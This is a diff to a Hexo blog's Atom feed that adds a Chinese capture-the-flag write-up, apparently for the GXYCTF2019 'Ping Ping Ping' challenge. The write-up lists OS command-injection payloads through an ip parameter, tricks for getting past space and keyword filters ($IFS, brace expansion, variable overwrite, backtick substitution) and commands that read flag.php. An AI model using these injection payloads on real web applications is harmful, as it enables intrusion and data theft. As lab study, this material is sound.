@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-20T12:14:23.958Z</updated>
+  <updated>2022-04-17T12:12:15.152Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>命令执行</title>
+    <link href="http://example.com/2022/04/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    <id>http://example.com/2022/04/11/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
+    <published>2022-04-11T12:02:56.000Z</published>
+    <updated>2022-04-17T12:12:15.152Z</updated>
+    
+    <content type="html"><![CDATA[<p>[GXYCTF2019]Ping Ping Ping</p><span id="more"></span><hr><p>?ip=127.0.0.1;ls<br>?ip=127.0.0.1;cat flag.php<br>过滤空格的解决办法如下<br>$IFS<br>${IFS}<br>$IFS$1 //$1改成$加其他数字貌似都行<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}  //用逗号实现了空格功能<br>%20<br>%09<br>?ip=127.0.0.1|cat$IFS$1flag.php<br><img src="https://s1.328888.xyz/2022/04/17/re4CF.png"><br>有过滤flag字样的，看看index.php，看看过滤规则。<br>?ip=127.0.0.1;cat$IFS$1index.php<br>![]<br>(<a href="https://s1.328888.xyz/2022/04/17/rUjvT.png">https://s1.328888.xyz/2022/04/17/rUjvT.png</a>)<br>很多符号都被过滤了。<br>1.cat fl* 利用*匹配任意 不行<br>2.echo “Y2F0IGZsYWcucGhw”| base64 -d | bash 也不行<br>3.ca\t fl\ag.php 不行<br>4.cat fl’’ag.php 不行<br>解决办法有两个<br>1.$a变量可以覆盖<br>构造?ip=127.0.0.1;a=g;cat$IFS$1index.php<br>查看一下源码，看到flag<br>![]<br>(<a href="https://s1.328888.xyz/2022/04/17/rUZIB.png">https://s1.328888.xyz/2022/04/17/rUZIB.png</a>)<br>2.利用<br>?ip=127.0.0.1;cat$IFS$9<code>ls</code><br>将ls的结果当成cat的参数，那样就不用出现flag这个参数了。<br>结果也是在源码中。</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;[GXYCTF2019]Ping Ping Ping&lt;/p&gt;</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>一个</title>
